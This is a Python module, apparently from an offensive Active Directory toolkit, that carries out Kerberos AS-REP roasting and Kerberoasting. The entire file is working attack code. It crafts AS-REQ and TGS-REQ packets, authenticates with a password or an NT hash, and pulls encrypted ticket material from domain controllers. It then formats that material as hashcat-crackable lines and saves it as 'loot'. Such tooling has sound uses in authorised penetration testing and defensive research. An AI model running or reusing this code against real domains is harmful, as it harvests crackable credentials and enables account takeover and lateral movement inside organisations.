#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Native Kerberos roast helpers (AS-REP / TGS) — no Impacket, no Rubeus."""

from __future__ import annotations

import datetime
import random
import socket
import struct
from binascii import hexlify
from dataclasses import dataclass
from typing import Iterable, List, Optional, Sequence, Tuple

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from lib.protocols.kerberos import asn1_msgs as asn1
from lib.protocols.kerberos.crypto_rc4 import (
    nt_hash_from_hex,
    nt_hash_from_password,
    rc4_hmac_decrypt,
    rc4_hmac_encrypt,
)


@dataclass
class RoastHash:
    kind: str  # krb5asrep | krb5tgs
    hash: str
    username: str = ""
    spn: str = ""
    etype: int = asn1.ETYPE_RC4
    hashcat_mode: str = ""

    def as_loot(self) -> dict:
        return {
            "kind": self.kind,
            "hash": self.hash,
            "username": self.username,
            "spn": self.spn,
            "hashcat_mode": self.hashcat_mode
            or ("18200" if self.kind == "krb5asrep" else "13100"),
        }


class KerberosError(Exception):
    def __init__(self, message: str, *, error_code: int = 0):
        super().__init__(message)
        self.error_code = int(error_code or 0)


def parse_domain_user(identity: str, default_domain: str = "") -> Tuple[str, str]:
    """Return (sam, DOMAIN) from DOMAIN\\user, user@domain, or bare user."""
    raw = str(identity or "").strip()
    domain = str(default_domain or "").strip()
    if not raw:
        return "", domain.upper()
    if "\\" in raw:
        dom, user = raw.split("\\", 1)
        return user.strip(), (dom or domain).upper()
    if "@" in raw and not raw.upper().startswith("CN="):
        user, dom = raw.split("@", 1)
        return user.strip(), (dom or domain).upper()
    # DN-like → last CN= often not sam; leave as-is for caller
    if "=" in raw:
        return raw, domain.upper()
    return raw, domain.upper()


def _flags(*bits: int) -> str:
    # KDCOptions BitString: MSB-first 32 bits (Impacket encodeFlags style)
    encoded = ["0"] * 32
    for bit in bits:
        if 0 <= int(bit) < 32:
            encoded[int(bit)] = "1"
    return "".join(encoded)


def _set_principal(container, name: str, name_type: int = asn1.NT_PRINCIPAL) -> None:
    """Fill an existing PrincipalName component (keeps CONTEXT tags)."""
    container["name-type"] = int(name_type)
    parts = [p for p in str(name).split("/") if p != ""]
    if not parts:
        parts = [str(name)]
    container["name-string"] = noValue
    for i, part in enumerate(parts):
        container["name-string"][i] = part


def _kerberos_time(dt: Optional[datetime.datetime] = None) -> str:
    when = dt or datetime.datetime.now(datetime.timezone.utc)
    if when.tzinfo is None:
        when = when.replace(tzinfo=datetime.timezone.utc)
    when = when.astimezone(datetime.timezone.utc)
    return when.strftime("%Y%m%d%H%M%SZ")


def send_recv(data: bytes, kdc_host: str, *, port: int = 88, timeout: float = 10.0) -> bytes:
    """Send a Kerberos PDU to the KDC (TCP preferred, UDP fallback)."""
    host = str(kdc_host or "").strip()
    if not host:
        raise KerberosError("KDC host is empty")
    # TCP: 4-byte big-endian length prefix
    packet = struct.pack(">I", len(data)) + data
    try:
        with socket.create_connection((host, int(port)), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(packet)
            hdr = _recv_exact(sock, 4)
            (length,) = struct.unpack(">I", hdr)
            if length <= 0 or length > 65535:
                raise KerberosError(f"Invalid KDC response length: {length}")
            return _recv_exact(sock, length)
    except OSError:
        # UDP fallback (small messages)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.settimeout(timeout)
            sock.sendto(data, (host, int(port)))
            resp, _ = sock.recvfrom(65535)
            return resp
        finally:
            sock.close()


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise KerberosError("KDC closed connection")
        buf += chunk
    return buf


def format_asrep_hash(etype: int, username: str, domain: str, cipher: bytes) -> RoastHash:
    user = str(username)
    realm = str(domain).upper()
    et = int(etype)
    if et in (asn1.ETYPE_AES128, asn1.ETYPE_AES256):
        # checksum last 12 bytes
        chk = hexlify(cipher[-12:]).decode()
        edata = hexlify(cipher[:-12]).decode()
        line = f"$krb5asrep${et}${user}${realm}${chk}${edata}"
    else:
        chk = hexlify(cipher[:16]).decode()
        edata = hexlify(cipher[16:]).decode()
        line = f"$krb5asrep${et}${user}@{realm}:{chk}${edata}"
    return RoastHash(
        kind="krb5asrep",
        hash=line,
        username=user,
        etype=et,
        hashcat_mode="18200" if et == asn1.ETYPE_RC4 else ("19600" if et == 17 else "19700"),
    )


def format_tgs_hash(
    etype: int,
    username: str,
    domain: str,
    spn: str,
    cipher: bytes,
) -> RoastHash:
    user = str(username)
    realm = str(domain).upper()
    spn_s = str(spn)
    et = int(etype)
    if et in (asn1.ETYPE_AES128, asn1.ETYPE_AES256):
        chk = hexlify(cipher[-12:]).decode()
        edata = hexlify(cipher[:-12]).decode()
        line = f"$krb5tgs${et}${user}${realm}${spn_s}${chk}${edata}"
        mode = "19600" if et == 17 else "19700"
    else:
        chk = hexlify(cipher[:16]).decode()
        edata = hexlify(cipher[16:]).decode()
        line = f"$krb5tgs${et}$*{user}${realm}${spn_s}*${chk}${edata}"
        mode = "13100"
    return RoastHash(
        kind="krb5tgs",
        hash=line,
        username=user,
        spn=spn_s,
        etype=et,
        hashcat_mode=mode,
    )


def _build_as_req(
    username: str,
    domain: str,
    *,
    etypes: Sequence[int] = (asn1.ETYPE_RC4,),
    pa_data: Optional[list] = None,
) -> bytes:
    domain = domain.upper()
    as_req = asn1.AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = asn1.AS_REQ_MSG

    if pa_data:
        as_req["padata"] = noValue
        for i, item in enumerate(pa_data):
            as_req["padata"][i] = noValue
            as_req["padata"][i]["padata-type"] = int(item[0])
            as_req["padata"][i]["padata-value"] = item[1]
    else:
        pac = asn1.KERB_PA_PAC_REQUEST()
        pac["include-pac"] = True
        as_req["padata"] = noValue
        as_req["padata"][0] = noValue
        as_req["padata"][0]["padata-type"] = asn1.PA_PAC_REQUEST
        as_req["padata"][0]["padata-value"] = encoder.encode(pac)

    body = as_req["req-body"]
    # forwardable(1), renewable(8), renewable-ok(27)
    body["kdc-options"] = _flags(1, 8, 27)
    _set_principal(body["cname"], username, asn1.NT_PRINCIPAL)
    body["realm"] = domain
    _set_principal(body["sname"], f"krbtgt/{domain}", asn1.NT_SRV_INST)
    till = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    body["till"] = _kerberos_time(till)
    body["rtime"] = _kerberos_time(till)
    body["nonce"] = random.getrandbits(31)
    body["etype"] = noValue
    for i, et in enumerate(etypes):
        body["etype"][i] = int(et)
    return encoder.encode(as_req)


def request_asrep_hash(
    username: str,
    domain: str,
    kdc_host: str,
    *,
    port: int = 88,
    timeout: float = 10.0,
) -> RoastHash:
    """AS-REP roast one account (UF_DONT_REQUIRE_PREAUTH). No password needed."""
    user, realm = parse_domain_user(username, domain)
    if not user or not realm:
        raise KerberosError("username and domain are required")

    etypes = (asn1.ETYPE_RC4, asn1.ETYPE_AES256, asn1.ETYPE_AES128)
    raw = send_recv(_build_as_req(user, realm, etypes=etypes), kdc_host, port=port, timeout=timeout)

    try:
        err, _ = decoder.decode(raw, asn1Spec=asn1.KRB_ERROR())
        code = int(err["error-code"])
        raise KerberosError(
            f"KRB_ERROR {code} for {user}@{realm} (preauth required or other failure)",
            error_code=code,
        )
    except KerberosError:
        raise
    except Exception:
        pass

    try:
        as_rep, _ = decoder.decode(raw, asn1Spec=asn1.AS_REP())
    except Exception as exc:
        raise KerberosError(f"Unexpected KDC response for {user}@{realm}: {exc}") from exc

    etype = int(as_rep["enc-part"]["etype"])
    cipher = bytes(as_rep["enc-part"]["cipher"])
    return format_asrep_hash(etype, user, realm, cipher)


def request_asrep_hashes(
    usernames: Iterable[str],
    domain: str,
    kdc_host: str,
    *,
    port: int = 88,
    timeout: float = 10.0,
) -> List[RoastHash]:
    out: List[RoastHash] = []
    for name in usernames:
        try:
            out.append(
                request_asrep_hash(name, domain, kdc_host, port=port, timeout=timeout)
            )
        except KerberosError:
            continue
    return out


def _pa_enc_timestamp(nt_key: bytes) -> Tuple[int, bytes]:
    ts = asn1.PA_ENC_TS_ENC()
    now = datetime.datetime.now(datetime.timezone.utc)
    ts["patimestamp"] = _kerberos_time(now)
    ts["pausec"] = now.microsecond
    enc = asn1.EncryptedData()
    enc["etype"] = asn1.ETYPE_RC4
    enc["cipher"] = rc4_hmac_encrypt(
        nt_key, asn1.KU_AS_REQ_PA_ENC_TS, encoder.encode(ts)
    )
    return asn1.PA_ENC_TIMESTAMP, encoder.encode(enc)


def get_tgt_rc4(
    username: str,
    domain: str,
    kdc_host: str,
    *,
    password: str = "",
    nthash: str = "",
    port: int = 88,
    timeout: float = 10.0,
) -> Tuple[object, bytes]:
    """Authenticate and return (AS_REP, session_key_bytes) for RC4."""
    user, realm = parse_domain_user(username, domain)
    if not user or not realm:
        raise KerberosError("username and domain are required")
    if nthash:
        key = nt_hash_from_hex(nthash)
    elif password:
        key = nt_hash_from_password(password)
    else:
        raise KerberosError("password or nthash required for TGT")

    pa_type, pa_value = _pa_enc_timestamp(key)
    pac = asn1.KERB_PA_PAC_REQUEST()
    pac["include-pac"] = True
    padata = [
        (pa_type, pa_value),
        (asn1.PA_PAC_REQUEST, encoder.encode(pac)),
    ]
    raw = send_recv(
        _build_as_req(user, realm, etypes=(asn1.ETYPE_RC4,), pa_data=padata),
        kdc_host,
        port=port,
        timeout=timeout,
    )

    try:
        err, _ = decoder.decode(raw, asn1Spec=asn1.KRB_ERROR())
        raise KerberosError(
            f"AS-REQ failed for {user}@{realm}: KRB_ERROR {int(err['error-code'])}",
            error_code=int(err["error-code"]),
        )
    except KerberosError:
        raise
    except Exception:
        pass

    as_rep, _ = decoder.decode(raw, asn1Spec=asn1.AS_REP())
    cipher = bytes(as_rep["enc-part"]["cipher"])
    plain = rc4_hmac_decrypt(key, asn1.KU_AS_REP_ENC_PART, cipher)
    try:
        enc_part, _ = decoder.decode(plain, asn1Spec=asn1.EncASRepPart())
    except Exception:
        enc_part, _ = decoder.decode(plain, asn1Spec=asn1.EncKDCRepPart())
    session_key = bytes(enc_part["key"]["keyvalue"])
    return as_rep, session_key


def _build_tgs_req(
    as_rep,
    session_key: bytes,
    username: str,
    domain: str,
    spn: str,
) -> bytes:
    domain = domain.upper()
    user, _ = parse_domain_user(username, domain)

    # Authenticator
    auth = asn1.Authenticator()
    auth["authenticator-vno"] = 5
    auth["crealm"] = domain
    _set_principal(auth["cname"], user)
    now = datetime.datetime.now(datetime.timezone.utc)
    auth["cusec"] = now.microsecond
    auth["ctime"] = _kerberos_time(now)
    enc_auth = asn1.EncryptedData()
    enc_auth["etype"] = asn1.ETYPE_RC4
    enc_auth["cipher"] = rc4_hmac_encrypt(
        session_key, asn1.KU_TGS_REQ_AUTH, encoder.encode(auth)
    )

    ap_req = asn1.AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = 14
    ap_req["ap-options"] = "00000000000000000000000000000000"
    ap_req["ticket"] = as_rep["ticket"]
    ap_req["authenticator"] = enc_auth

    tgs = asn1.TGS_REQ()
    tgs["pvno"] = 5
    tgs["msg-type"] = asn1.TGS_REQ_MSG
    tgs["padata"] = noValue
    tgs["padata"][0] = noValue
    tgs["padata"][0]["padata-type"] = asn1.PA_TGS_REQ
    tgs["padata"][0]["padata-value"] = encoder.encode(ap_req)

    body = tgs["req-body"]
    body["kdc-options"] = _flags(1, 8, 27)
    body["realm"] = domain
    if "/" in spn:
        _set_principal(body["sname"], spn, asn1.NT_SRV_INST)
    else:
        _set_principal(body["sname"], spn, asn1.NT_PRINCIPAL)
    till = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    body["till"] = _kerberos_time(till)
    body["nonce"] = random.getrandbits(31)
    body["etype"] = noValue
    body["etype"][0] = asn1.ETYPE_RC4
    body["etype"][1] = asn1.ETYPE_AES256
    body["etype"][2] = asn1.ETYPE_AES128
    return encoder.encode(tgs)


def request_tgs_hash(
    username: str,
    domain: str,
    kdc_host: str,
    spn: str,
    *,
    password: str = "",
    nthash: str = "",
    port: int = 88,
    timeout: float = 10.0,
    as_rep=None,
    session_key: Optional[bytes] = None,
    service_sam: str = "",
) -> RoastHash:
    """Kerberoast one SPN (authenticated). Reuse TGT via as_rep/session_key if provided."""
    user, realm = parse_domain_user(username, domain)
    spn_s = str(spn or "").strip()
    if not spn_s:
        raise KerberosError("SPN is required")
    if as_rep is None or session_key is None:
        as_rep, session_key = get_tgt_rc4(
            user,
            realm,
            kdc_host,
            password=password,
            nthash=nthash,
            port=port,
            timeout=timeout,
        )
    raw = send_recv(
        _build_tgs_req(as_rep, session_key, user, realm, spn_s),
        kdc_host,
        port=port,
        timeout=timeout,
    )
    try:
        err, _ = decoder.decode(raw, asn1Spec=asn1.KRB_ERROR())
        raise KerberosError(
            f"TGS-REQ failed for {spn_s}: KRB_ERROR {int(err['error-code'])}",
            error_code=int(err["error-code"]),
        )
    except KerberosError:
        raise
    except Exception:
        pass

    tgs_rep, _ = decoder.decode(raw, asn1Spec=asn1.TGS_REP())
    etype = int(tgs_rep["ticket"]["enc-part"]["etype"])
    cipher = bytes(tgs_rep["ticket"]["enc-part"]["cipher"])
    svc = str(service_sam or "").strip() or spn_s.split("/", 1)[0]
    return format_tgs_hash(etype, svc, realm, spn_s, cipher)


def request_tgs_hashes(
    username: str,
    domain: str,
    kdc_host: str,
    targets: Iterable,
    *,
    password: str = "",
    nthash: str = "",
    port: int = 88,
    timeout: float = 10.0,
) -> List[RoastHash]:
    """``targets`` is iterable of SPN strings or ``(spn, service_sam)`` tuples."""
    as_rep, session_key = get_tgt_rc4(
        username,
        domain,
        kdc_host,
        password=password,
        nthash=nthash,
        port=port,
        timeout=timeout,
    )
    out: List[RoastHash] = []
    for item in targets:
        if isinstance(item, (tuple, list)) and len(item) >= 1:
            spn = item[0]
            sam = item[1] if len(item) > 1 else ""
        else:
            spn, sam = item, ""
        try:
            out.append(
                request_tgs_hash(
                    username,
                    domain,
                    kdc_host,
                    str(spn),
                    port=port,
                    timeout=timeout,
                    as_rep=as_rep,
                    session_key=session_key,
                    service_sam=str(sam or ""),
                )
            )
        except KerberosError:
            continue
    return out
